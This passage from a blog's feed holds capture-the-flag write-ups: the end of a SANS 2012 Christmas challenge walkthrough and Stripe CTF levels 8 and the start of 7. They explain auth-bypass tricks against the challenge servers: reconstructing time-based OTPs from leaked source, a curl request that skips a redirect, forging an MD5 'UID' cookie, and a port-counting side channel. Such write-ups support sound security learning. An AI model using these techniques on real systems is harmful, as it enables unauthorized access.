&lt;img alt="heat_miser_tweet_3.png" class="align-center" src="/images/sans-christmas-challenge-2012/heat_miser_tweet_3.png" /&gt;
&lt;p&gt;By looking at &lt;a class="reference external" href="http://pen-testing.sans.org/blog/pen-testing/2012/12/06/all-your-svn-are-belong-to-us"&gt;the tutorial he
gives&lt;/a&gt;
(see, this meme doesn't get old!) we can get the index page source code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;generate_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$time&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nv"&gt;$pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;$time&lt;/span&gt;&lt;span class="s2"&gt; 7998f77a7dc74f182a76219d7ee58db38be3841c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$pass&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;verify_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$inpass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;// passwords are valid for up to 3 minutes&lt;/span&gt;
        &lt;span class="c1"&gt;// don&amp;#39;t forget to use the server time (see the noaccess.php page)&lt;/span&gt;
        &lt;span class="nv"&gt;$validstamps&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;strtotime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;+1 minute&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt; &lt;span class="c1"&gt;// added just in case the time sync is off&lt;/span&gt;
            &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
            &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;strtotime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-1 minute&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
            &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;strtotime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-2 minute&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
        &lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$validstamps&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nv"&gt;$stamp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;strtolower&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$inpass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nx"&gt;generate_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$stamp&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;TRUE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;FALSE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;
        &lt;span class="nx"&gt;verify_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;verify_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nb"&gt;setcookie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;generate_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)));&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Location: noaccess.php&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="nv"&gt;$accessallowed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;TRUE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$zone&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;require_once&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;../include/template.inc.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now we know how the One Time Passwords are generated. We just have to
send the correct SHA1 sum, using the server's current time, which we can
find in the source code of the noaccess.php page.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="zone-5"&gt;
&lt;h3&gt;Zone 5&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;3ab1c5fa327343721bc798f116be8dc6&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Game over for the North Pole.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="heat-miser"&gt;
&lt;h2&gt;&lt;a class="reference external" href="http://heatmiser.counterhack.com/"&gt;Heat Miser&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="id1"&gt;
&lt;h3&gt;Zone 0&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;1732bcff12e6550ff9ea44d594001418&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We had a security concern where the Zone 1 URL ended up in search
engine results. We added a file to prevent the search engines from
caching these pages. The system is now secure an no unauthorized
users have access to the URL.&lt;/p&gt;
&lt;p&gt;Don't even try to access the other zones, because you won't be able
to. And if you are helping my brother, GO AWAY!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The important part here is the file to prevent indexing by search
engines. Heat Miser is talking about the robots.txt file, which tells
search engine crawlers what page they can crawl. By loading this file,
we find the wanted URL: zone-1-E919DBF1-E4FA-4141-97C4-3F38693D2161.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id2"&gt;
&lt;h3&gt;Zone 1&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;d8c94233daef256c42bb95bd61382e02&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
We had an issue with Zone 2 and we had to temporarily remove the
link. It is now back and in full operation. We appoligize to those
living in Zone 2 as it may have gotten a tad chilly. Everything is
fully operational now.&lt;/blockquote&gt;
&lt;p&gt;Looking at the comment will give you the URL to the next zone:
zone-2-761EBBCF-099F-4DB0-B63F-9ADC61825D49&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id3"&gt;
&lt;h3&gt;Zone 2&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;ef963731de7e886226fe4a6a6c2971f1&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
We are sorry, but due to the negligence of one of our fiery minions,
we had to change the link for Zone 3. If you should have access then
you should have received an email. The new zone 3 link starts with
zone-3-83FEE8BE-B1C6-4395-A56A-XXXXXXXXXXXX.&lt;/blockquote&gt;
&lt;p&gt;There are 281,474,976,710,656 possibilities for the last set of numbers,
so don't bother brute forcing it. Once again, we have an incomplete URL.
But Heat Miser tweets this message:&lt;/p&gt;
&lt;img alt="heat_miser_tweet_1.png" class="align-center" src="/images/sans-christmas-challenge-2012/heat_miser_tweet_1.png" /&gt;
&lt;p&gt;The tweeted image is:&lt;/p&gt;
&lt;img alt="heat_miser_transparent_terminal.png" class="align-center" src="/images/sans-christmas-challenge-2012/heat_miser_transparent_terminal.png" /&gt;
&lt;p&gt;And, as Snow Miser says:&lt;/p&gt;
&lt;img alt="snow_miser_tweet_2.png" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_tweet_2.png" /&gt;
&lt;p&gt;This is looks just like the first level of Snow Miser. Using GIMP, we
can make the end of the URL appear:&lt;/p&gt;
&lt;img alt="heat_miser_transparent_terminal_enhanced.png" class="align-center" src="/images/sans-christmas-challenge-2012/heat_miser_transparent_terminal_enhanced.png" /&gt;
&lt;p&gt;Which gives us the URL: zone-3-83FEE8BE-B1C6-4395-A56A-BF933FC85254&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id4"&gt;
&lt;h3&gt;Zone 3&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;0d524fb8d8f9f88eb9da5b286661a824&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We added a new security mechanism to Zone 4 so it won't matter if
SOMEONE LEAKS IT AGAIN!&lt;/p&gt;
&lt;p&gt;Zone 4 (zone-4-0F2EA639-19BF-40DD-A38D-635E1344C02B)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We can directly access zone 4, since Heat Miser posts a link to it. But
when we click it, we're redirected to another page, noaccess.php. The
hint comes from a tweet from Snow Miser:&lt;/p&gt;
&lt;img alt="snow_miser_tweet_3.png" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_tweet_3.png" /&gt;
&lt;p&gt;The tweeted image is from &lt;a class="reference external" href="http://knowyourmeme.com/memes/the-most-interesting-man-in-the-world"&gt;the most interesting man in the
world&lt;/a&gt;:&lt;/p&gt;
&lt;img alt="snow_miser_most_interesting_man.jpg" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_most_interesting_man.jpg" /&gt;
&lt;p&gt;Heat Miser redirects us, using a &lt;code&gt;header(&amp;quot;location: new_url&amp;quot;);&lt;/code&gt;, but
forgets to use the &lt;code&gt;exit&lt;/code&gt; function. It
means that the rest of the page is executed, then sent to our browser,
with a Location header, which our browser follows. But if we use a
client which does not follow redirection, we can recover the first page.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl &lt;span class="s2"&gt;&amp;quot;http://heatmiser.counterhack.com/zone-4-0F2EA639-19BF-40DD-A38D-635E1344C02B/&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;zone-5&amp;quot;&lt;/span&gt;
Link to &amp;lt;a &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/zone-5-15614E3A-CEA7-4A28-A85A-D688CC418287/&amp;quot;&lt;/span&gt;&amp;gt;Zone &lt;span class="m"&gt;5&lt;/span&gt;&amp;lt;/a&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="id5"&gt;
&lt;h3&gt;Zone 4&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;e3ae414e6d428c3b0c7cff03783e305f&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Okay, we have the URL to zone 5, but when we try to access it directly,
we're redirected again to noaccess.php. To give us a clue about where to
look, Snow Miser tweets:&lt;/p&gt;
&lt;img alt="snow_miser_tweet_4.png" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_tweet_4.png" /&gt;
&lt;p&gt;So, we know that we should look at the cookies. There's only one:
&lt;code&gt;UID=b8c37e33defde51cf91e1e03e51657da&lt;/code&gt;. A 32 byte hex string:
it looks like a MD5 hash. If we reverse it (using online tools, or
programs like John The Ripper), we find that it's the hash of the string
&amp;quot;1001&amp;quot;, which explains Snow Miser's tweet.&lt;/p&gt;
&lt;p&gt;A value like 1001, and a name like UID indicates that this hash
corresponds to a user ID, and an unprivileged one, since he can't access
zone 5. The first value I tried was a UID of 0 (which means a MD5 of
&lt;code&gt;cfcd208495d565ef66e7dff9f98764da&lt;/code&gt;) since it's root's UID on
Linux, but it turned out that the correct value was 1 (which means a MD5
&lt;code&gt;c4ca4238a0b923820dcc509a6f75849b&lt;/code&gt;). We modify the cookie's
value, and we reload the page to access zone 5.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id6"&gt;
&lt;h3&gt;Zone 5&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;f478c549e37fa33467241d847f862e6f&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Game over for Southtown.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="conclusion"&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;I'll give it to you: this challenge wasn't really complicated. Mostly
because the first zones of both controllers were kinda easy, but also
because of all the hints in the tweets. Yet, I'm still glad I did it
because:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;I learned the SVN vulnerability&lt;/li&gt;
&lt;li&gt;I learned common mistakes, like forgetting &lt;code&gt;exit&lt;/code&gt; after a
redirect&lt;/li&gt;
&lt;li&gt;I added new tricks to my &amp;quot;to-do&amp;quot; list when looking for
vulnerability/information disclosure (like the use of steghide, or
looking at files in docs leaks)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I hoped this wasn't too long, and that you learned something from it. I
wish you a merry Christmas, a happy new year, and lots of pentesting ;)&lt;/p&gt;
&lt;p&gt;Cheers.&lt;/p&gt;
&lt;/div&gt;
</content></entry><entry><title>Stripe CTF: Level #8</title><link href="https://allyourbase.utouch.fr/posts/2012/12/15/stripe-ctf-level-8/" rel="alternate"></link><published>2012-12-15T20:06:00+01:00</published><updated>2012-12-15T20:06:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-12-15:/posts/2012/12/15/stripe-ctf-level-8/</id><summary type="html">&lt;img alt="level08-logo.jpg" class="align-center" src="/images/stripe-ctf-level-8/level08-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-8/stripe-ctf-level08.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256:
&lt;code&gt;d211aa240a0a59eb1f56d3c42a55080d0e27eea2c04bc4410bf608824c847c96&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This is it. The final level to the Stripe CTF. The goal here is to
retrieve a 12-digit password, which is too long to brute force. Let's
see how we can use the protocol to our advantage.&lt;/p&gt;
&lt;p&gt;The infrastructure …&lt;/p&gt;</summary><content type="html">&lt;img alt="level08-logo.jpg" class="align-center" src="/images/stripe-ctf-level-8/level08-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-8/stripe-ctf-level08.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256:
&lt;code&gt;d211aa240a0a59eb1f56d3c42a55080d0e27eea2c04bc4410bf608824c847c96&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This is it. The final level to the Stripe CTF. The goal here is to
retrieve a 12-digit password, which is too long to brute force. Let's
see how we can use the protocol to our advantage.&lt;/p&gt;
&lt;p&gt;The infrastructure looks like this:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;a central server, used to verify the password&lt;/li&gt;
&lt;li&gt;four &amp;quot;chunk&amp;quot; servers, which each knows only a part of the password&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;When you send a password to the central server, it cuts it in four
pieces, and procedes like this:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;it asks the first chunk server if the first piece is correct&lt;/li&gt;
&lt;li&gt;if not, it sends a failure message to the client (and doesn't contact
any other chunk server)&lt;/li&gt;
&lt;li&gt;if it is, it asks the second chunk server if the second piece is
correct&lt;/li&gt;
&lt;li&gt;etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Furthermore, we can give the server a list of webhooks, to which it'll
send the result.&lt;/p&gt;
&lt;p&gt;Seeing the password verification protocol, I know what you're thinking:
timing attack. Seeing how much time the server takes to respond, we can
find how many chunk servers it contacted, thus how many chunk we
&lt;span class="formula"&gt;10&lt;sup&gt;12&lt;/sup&gt;&lt;/span&gt; possibilities, we're down to
&lt;span class="formula"&gt;4 × 10&lt;sup&gt;3&lt;/sup&gt;&lt;/span&gt; possibilities, which is feasible.&lt;/p&gt;
&lt;p&gt;The problem is that the server has a way to prevent timing attack:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# File primary_server, line 58&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;nextServerCallback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;parsed_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;# Chunk was wrong!&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;parsed_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;success&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
        &lt;span class="c1"&gt;# Defend against timing attacks&lt;/span&gt;
        &lt;span class="n"&gt;remaining_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;expectedRemainingTime&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;log_info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Going to wait &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt; seconds before responding&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;
        &lt;span class="n"&gt;remaining_time&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;reactor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;callLater&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;remaining_time&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendResult&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt;

    &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;checkNext&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If a chunk is wrong, the server waits before telling the client he made
a mistake. So we can't use a timing attack.&lt;/p&gt;
&lt;p&gt;But there is another way to know how many chunk servers the primary
contacted, and thus go from &lt;span class="formula"&gt;10&lt;sup&gt;12&lt;/sup&gt;&lt;/span&gt; to &lt;span class="formula"&gt;4 × 10&lt;sup&gt;3&lt;/sup&gt;&lt;/span&gt;
the webhooks. Here is the idea:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;when the primary server communicates with an external resource
(whether it's a chunk server or a webhook), it opens a socket&lt;/li&gt;
&lt;li&gt;every time the primary server opens a socket, its client port is
incremented by one&lt;/li&gt;
&lt;li&gt;the webhook knows the client port of the primary server&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So, by looking at how much was the client port incremented between two
responses, the webhook knows how many chunk servers were contacted.
Indeed, let's say the first chunk is wrong: the primary server connects
to the first chunk server, then to the webhook. The port is therefore
incremented by two. If the first chunk is correct, but not the second is
wrong, the primary servers contacts the first chunk server, the second
chunk server, then the webhook. The port is incremented by three, etc.&lt;/p&gt;
&lt;p&gt;So, knowing this we can't find the correct chunks, but we can eliminate
the bad chunks, which is faster than bruteforcing the whole password,
but still takes a lot of time. What's more, the primary server can only
contact webhooks with URL ending with .stripe-ctf.com (in the production
environment). Fortunately, we still have access to the level 2 server
(remember, the one with the upload vulnerability?) We can upload an SSH
key, connect, and then launch our webhook.&lt;/p&gt;
&lt;p&gt;Unfortunately, I lost the source code of my custom webhook (sorry about
that!). It was based on a webhook coded by a friend of Lopi. Basically,
it tried every possible combination, chunk by chunk, and eliminated the
bad ones as it did so.&lt;/p&gt;
&lt;p&gt;The attack took something like two days, because I kept being
disconnected of the server, and because there were so many people on it
running their own webhook. I think it was kind of stubborn from Stripe
to force the webhook to be on one of their server.&lt;/p&gt;
&lt;img alt="level08-scumbag-stripe.png" class="align-center" src="/images/stripe-ctf-level-8/level08-scumbag-stripe.png" /&gt;
&lt;p&gt;Anyway, after some time, you find the correct password, which you submit
to the Stripe web site.&lt;/p&gt;
&lt;img alt="level08-w00t.png" class="align-center" src="/images/stripe-ctf-level-8/level08-w00t.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
&lt;p&gt;That's it for the Stripe CTF! I know I took a lot of time writing these
write ups, but I learned a lot from this competition, especially the
SHA1 padding attack, how to find where to put my Javascript so it's
executed, and how to obfuscate it. Plus I won a super cool t-shirt!&lt;/p&gt;
&lt;p&gt;See you for another CTF!&lt;/p&gt;
&lt;img alt="stripe-ctf-prize.jpg" class="align-center" src="/images/stripe-ctf-level-8/stripe-ctf-prize.jpg" /&gt;
</content></entry><entry><title>Stripe CTF: Level #7</title><link href="https://allyourbase.utouch.fr/posts/2012/12/09/stripe-ctf-level-7/" rel="alternate"></link><published>2012-12-09T15:07:00+01:00</published><updated>2012-12-09T15:07:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-12-09:/posts/2012/12/09/stripe-ctf-level-7/</id><summary type="html">&lt;img alt="level07-logo.jpg" class="align-center" src="/images/stripe-ctf-level-7/level07-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-7/stripe-ctf-level07.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256:
&lt;code&gt;d497f25a620a2ad5e3850bf642cfc1df988e32b612d06f48fffa271912726e86&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level is the most delicious of all: you can order waffles online,
and the company will have them delivered to the location you specified.
There are seven types of waffle: veritaffle, belgian, brussels, eggo,
chicken (premium), dream (premium …&lt;/p&gt;</summary><content type="html">&lt;img alt="level07-logo.jpg" class="align-center" src="/images/stripe-ctf-level-7/level07-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-7/stripe-ctf-level07.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256:
&lt;code&gt;d497f25a620a2ad5e3850bf642cfc1df988e32b612d06f48fffa271912726e86&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level is the most delicious of all: you can order waffles online,
and the company will have them delivered to the location you specified.
There are seven types of waffle: veritaffle, belgian, brussels, eggo,
chicken (premium), dream (premium), and the king of waffles, liege
(premium). You have an unprivileged account (login: ctf, password:
password), so you can't order premium waffles. Yet, your goal is to
order the supreme waffle: the liege. There are four other users on the
website: larry (premium account), randall (premium account), alice and
bob. Every user has an ID, and a secret (which has the form of a random
string).&lt;/p&gt;
&lt;img alt="level07-ctf-user-interface.png" class="align-center" src="/images/stripe-ctf-level-7/level07-ctf-user-interface.png" /&gt;
&lt;p&gt;The company provides you with a client API you can use to order waffles.
Every order is of the form:
&lt;code&gt;count=XXX&amp;amp;lat=XXX&amp;amp;user_id=XXX&amp;amp;long=XXX&amp;amp;waffle=XXX&lt;/code&gt;. Then, a
signature is computed using the client's secret, and appended to the
order. The signature is of the form:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# File client.py, line 61&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;_signature&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
